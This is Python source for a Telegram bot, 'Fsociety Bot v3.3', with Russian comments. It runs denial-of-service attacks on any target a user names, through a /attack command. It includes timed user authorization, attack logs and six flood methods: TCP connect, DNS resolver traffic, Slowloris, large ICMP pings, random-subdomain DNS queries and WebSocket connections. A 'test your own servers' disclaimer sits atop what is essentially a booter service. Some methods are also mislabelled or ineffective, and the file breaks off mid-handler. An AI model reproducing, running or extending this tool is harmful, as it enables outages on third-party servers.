#!/usr/bin/env python3
# ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
# ██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
# ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
# Fsociety Bot v3.3 - автоматический сброс вебхука
# by Колин (survivor) - теперь вебхуки не страшны
# ⚠️ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ СВОИХ СЕРВЕРОВ! ⚠️

import os
import sys
import asyncio
import aiohttp
import socket
import random
import time
import json
import requests
from threading import Thread
from datetime import datetime

from telebot import TeleBot
from telebot.types import Message

# ========== НАСТРОЙКИ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("❌ Переменная окружения BOT_TOKEN не установлена!")

ADMIN_IDS_STR = os.getenv('ADMIN_IDS', '')
if ADMIN_IDS_STR:
    ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(',') if x.strip()]
    print(f"✅ Загружены администраторы: {ADMIN_IDS}")
else:
    ADMIN_IDS = []
    print("⚠️ ADMIN_IDS не задана! Никто не является администратором.")

DEFAULT_MAX_TASKS = 50000
DEFAULT_TIMEOUT = 5

SETTINGS_FILE = "settings.json"
settings = {}

def load_settings():
    global settings
    try:
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
        print(f"✅ Настройки загружены из {SETTINGS_FILE}: {settings}")
    except FileNotFoundError:
        settings = {
            'max_tasks': int(os.getenv('MAX_TASKS', DEFAULT_MAX_TASKS)),
            'timeout': int(os.getenv('TIMEOUT', DEFAULT_TIMEOUT))
        }
        save_settings()
        print(f"✅ Настройки созданы по умолчанию: {settings}")
    except Exception as e:
        print(f"❌ Ошибка загрузки настроек: {e}, использую значения по умолчанию")
        settings = {
            'max_tasks': DEFAULT_MAX_TASKS,
            'timeout': DEFAULT_TIMEOUT
        }

def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)
    except Exception as e:
        print(f"❌ Ошибка сохранения настроек: {e}")

load_settings()
# ======================================================

bot = TeleBot(BOT_TOKEN)

USERS_FILE = "authorized_users.json"
LOGS_FILE = "attack_logs.json"

authorized_users = {}
active_attacks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# ========== ФУНКЦИЯ УДАЛЕНИЯ ВЕБХУКА ==========
def delete_webhook():
    """Принудительно удаляет вебхук, чтобы polling работал"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                print("✅ Вебхук успешно удалён")
            else:
                print(f"⚠️ Не удалось удалить вебхук: {data.get('description', 'неизвестная ошибка')}")
        else:
            print(f"⚠️ HTTP ошибка при удалении вебхука: {response.status_code}")
    except Exception as e:
        print(f"❌ Ошибка при удалении вебхука: {e}")

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def load_users():
    global authorized_users
    try:
        with open(USERS_FILE, 'r') as f:
            authorized_users = json.load(f)
            authorized_users = {int(k): v for k, v in authorized_users.items()}
    except FileNotFoundError:
        authorized_users = {}

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(authorized_users, f)

def log_attack(user_id, username, target, port, method, duration):
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'method': method,
        'duration': duration
    }
    try:
        with open(LOGS_FILE, 'r') as f:
            logs = json.load(f)
    except FileNotFoundError:
        logs = []
    logs.append(log_entry)
    if len(logs) > 1000:
        logs = logs[-1000:]
    with open(LOGS_FILE, 'w') as f:
        json.dump(logs, f, indent=2)

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_authorized(user_id):
    if is_admin(user_id):
        return True
    if user_id in authorized_users:
        expiry = authorized_users[user_id]
        if expiry > time.time():
            return True
        else:
            del authorized_users[user_id]
            save_users()
    return False

# ========== КОМАНДЫ УПРАВЛЕНИЯ НАСТРОЙКАМИ ==========
@bot.message_handler(commands=['set_maxtasks'])
def set_maxtasks(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    try:
        new_max = int(message.text.split()[1])
        if new_max < 100 or new_max > 100000:
            bot.reply_to(message, "❌ Число должно быть от 100 до 100000")
            return
        settings['max_tasks'] = new_max
        save_settings()
        bot.reply_to(message, f"✅ Максимальное количество задач изменено на {new_max}")
    except (IndexError, ValueError):
        bot.reply_to(message, "❌ Использование: /set_maxtasks <число>")

@bot.message_handler(commands=['settings'])
def show_settings(message: Message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    text = (
        f"⚙️ **Текущие настройки Fsociety**\n\n"
        f"📊 Макс. задач: `{settings['max_tasks']}`\n"
        f"⏱️ Таймаут: `{settings['timeout']} сек`\n"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

# ========== КОМАНДЫ УПРАВЛЕНИЯ ПОЛЬЗОВАТЕЛЯМИ (ТОЛЬКО АДМИН) ==========
@bot.message_handler(commands=['adduser'])
def add_user(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ Использование: /adduser <user_id> <days>")
            return
        user_id = int(parts[1])
        days = int(parts[2])
        expiry = time.time() + (days * 86400)
        authorized_users[user_id] = expiry
        save_users()
        bot.reply_to(message, f"✅ Пользователь {user_id} добавлен на {days} дней")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['removeuser'])
def remove_user(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in authorized_users:
            del authorized_users[user_id]
            save_users()
            bot.reply_to(message, f"✅ Пользователь {user_id} удалён")
        else:
            bot.reply_to(message, f"❌ Пользователь {user_id} не найден")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['users'])
def list_users(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    if not authorized_users:
        bot.reply_to(message, "📭 Нет авторизованных пользователей")
        return
    response = "📋 **Авторизованные пользователи:**\n\n"
    for uid, expiry in authorized_users.items():
        expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M')
        response += f"🆔 `{uid}` — до {expiry_date}\n"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def show_logs(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    try:
        with open(LOGS_FILE, 'r') as f:
            logs = json.load(f)
    except FileNotFoundError:
        bot.reply_to(message, "📭 Логов пока нет")
        return
    if not logs:
        bot.reply_to(message, "📭 Логов пока нет")
        return
    response = "📊 **Последние атаки:**\n\n"
    for log in logs[-10:]:
        response += f"🕒 {log['timestamp']}\n"
        response += f"👤 {log['username']} (ID: {log['user_id']})\n"
        response += f"🎯 {log['target']}:{log['port']} | {log['method']} | {log['duration']}с\n\n"
    bot.reply_to(message, response, parse_mode='Markdown')

# ========== ОСНОВНЫЕ КОМАНДЫ ==========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message: Message):
    help_text = """
🤖 **Fsociety Bot v3.3**

_"Hello, friend."_

**Команды для всех:**
/start — это сообщение
/help — справка
/methods — список доступных методов атаки
/attack <method> <target> <port> <time> — запустить атаку
/stop — остановить текущую атаку
/settings — текущие настройки

**Команды для администраторов:**
/set_maxtasks <число> — изменить максимальное количество задач (100-100000)
/adduser <user_id> <days> — добавить пользователя
/removeuser <user_id> — удалить пользователя
/users — список пользователей
/logs — логи атак

**Методы атаки:**
• `syn` — SYN Flood (TCP соединения)
• `udp` — UDP Amplification (DNS reflector)
• `slow` — HTTP Slowloris
• `icmp` — ICMP Ping Storm
• `dns` — DNS Water Torture
• `ws` — WebSocket Armageddon

⚠️ **Только для тестирования своих серверов!**
    """
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['methods'])
def show_methods(message: Message):
    methods_text = """
📚 **Доступные методы атаки** 

1️⃣ **SYN Flood** — исчерпание TCP-соединений поддельными SYN-пакетами
2️⃣ **UDP Amplification** — усиление трафика через открытые DNS-резолверы (до 100x)
3️⃣ **HTTP Slowloris** — частичные HTTP-запросы, исчерпание потоков сервера
4️⃣ **ICMP Ping Storm** — традиционный ICMP-флуд с большими пакетами
5️⃣ **DNS Water Torture** — рандомизированные поддомены для краха резолверов
6️⃣ **WebSocket Armageddon** — постоянные WebSocket-соединения с нагрузкой

Пример: `/attack syn example.com 80 60`
    """
    bot.reply_to(message, methods_text, parse_mode='Markdown')

# ========== МЕТОДЫ АТАК ==========
async def syn_flood(target, port, duration, tasks_count, chat_id, attack_id):
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.close()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks_count, 1000))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def udp_amplification(target, port, duration, tasks_count, chat_id, attack_id):
    dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
    dns_query = bytes.fromhex("a1b2" + "0100" + "0001" + "0000" + "0000" + "0000" + "06676f6f676c6503636f6d00" + "00ff" + "0001")
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                dns = random.choice(dns_servers)
                sock.sendto(dns_query, (dns, 53))
                total += 1
            except:
                pass
        sock.close()
    tasks = [worker() for _ in range(tasks_count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def slowloris(target, port, duration, tasks_count, chat_id, attack_id):
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                reader, writer = await asyncio.open_connection(target, port)
                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                await writer.drain()
                for _ in range(10):
                    if time.time() >= end_time: break
                    writer.write(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(5)
                writer.close()
                await writer.wait_closed()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks_count, 1000))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def icmp_flood(target, duration, tasks_count, chat_id, attack_id):
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                proc = await asyncio.create_subprocess_exec(
                    'ping', '-c', '1', '-s', '65500', target,
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
                )
                await proc.wait()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks_count, 500))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def dns_water_torture(target, duration, tasks_count, chat_id, attack_id):
    letters = 'abcdefghijklmnopqrstuvwxyz'
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                sub = ''.join(random.choices(letters, k=random.randint(5,10)))
                await asyncio.create_subprocess_exec(
                    'nslookup', f"{sub}.{target}",
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
                )
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(tasks_count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def websocket_armageddon(target, port, duration, tasks_count, chat_id, attack_id):
    total = 0
    end_time = time.time() + duration
    async def worker():
        nonlocal total
        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
            try:
                reader, writer = await asyncio.open_connection(target, port)
                handshake = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {random.getrandbits(24):x}==\r\n"
                    f"Sec-WebSocket-Version: 13\r\n\r\n"
                )
                writer.write(handshake.encode())
                await writer.drain()
                await asyncio.sleep(10)
                writer.close()
                await writer.wait_closed()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks_count, 500))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

# ========== ДИСПЕТЧЕР АТАК ==========
async def attack_worker(method, target, port, duration, tasks_count, chat_id, attack_id, username):
    target = target.replace('http://', '').replace('https://', '').split('/')[0]
    if method == 'syn':
        total = await syn_flood(target, port, duration, tasks_count, chat_id, attack_id)
    elif method == 'udp':
        total = await udp_amplification(target, port, duration, tasks_count, chat_id, attack_id)
    elif method == 'slow':
        total = await slowloris(target, port, duration, tasks_count, chat_id, attack_id)
    elif method == 'icmp':
        total = await icmp_flood(target, duration, tasks_count, chat_id, attack_id)
    elif method == 'dns':
        total = await dns_water_torture(target, duration, tasks_count, chat_id, attack_id)
    elif method == 'ws':
        total = await websocket_armageddon(target, port, duration, tasks_count, chat_id, attack_id)
    else:
        total = 0
    log_attack(chat_id, username, target, port, method, duration)
    if chat_id in active_attacks and active_attacks[chat_id] == attack_id:
        del active_attacks[chat_id]
    bot.send_message(
        chat_id,
        f"⚔️ **Атака завершена**\n\n"
        f"🎯 Цель: {target}:{port}\n"
        f"🔧 Метод: {method.upper()}\n"
        f"⏱️ Длительность: {duration} сек\n"
        f"🧵 Задач: {tasks_count}\n"
        f"📨 Отправлено пакетов: ~{total}",
        parse_mode='Markdown'
    )

def run_attack(method, target, port, duration, tasks, chat_id, attack_id, username):
    asyncio.run(attack_worker(method, target, port, duration, tasks, chat_id, attack_id, username))

@bot.message_handler(commands=['attack'])
def attack_command(message: Message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён. Обратись к администратору.")
        return
    try:
        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, "❌ Использование: /attack <method> <target> <port> <time>")
            return
        method = parts[1].lower()
        target = parts[2]
        port = int(parts[3])
        duration = int(parts[4])
        valid_methods = ['syn', 'udp', 'slow', 'icmp', 'dns', 'ws']
        if method not in valid_methods:
            bot.reply_to(message, f"❌ Неверный метод. Доступны: {', '.join(valid_methods)}")
            return
        if duration > 3600:
            bot.reply_to(message, "❌ Максимальное время атаки — 3600 секунд (1 час)")
            return
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Порт должен быть от 1 до 65535")
            return
        if message.chat.id in active_attacks:
            bot.reply_to(message, "⚠️ Уже есть активная атака. Сначала останови её командой /stop")
            return
        tasks_count = settings['max_tasks']
        if len(parts) >= 6:
            tasks_count = min(int(parts[5]), settings['max_tasks'])
        attack_id = f"{message.chat.id}_{int(time.time())}"
        active_attacks[message.chat.id] = attack_id
        username = message.from_user.username or str(message.from_user.id)
        bot.reply_to(message, f"⚔️ Атака запущена на {target}:{port} методом {method} на {duration} сек с {tasks_count} задачами")
        t = Thread(target=run_attack, args=(method, target, port, duration, tasks_count, message.chat.id, attack_id, username))
        t.daemon = True
        t.start()
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def stop_command(message: Message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "❌ Доступ запрещён")
        return
    if message.chat.id in active_attacks:
        del active_attacks[message.chat.id]
        bot.reply_to(message, "🛑 Атака остановлена")
    else:
        bot.reply_to(message, "ℹ️ Нет активных атак")

@bot.message_handler(func=lambda
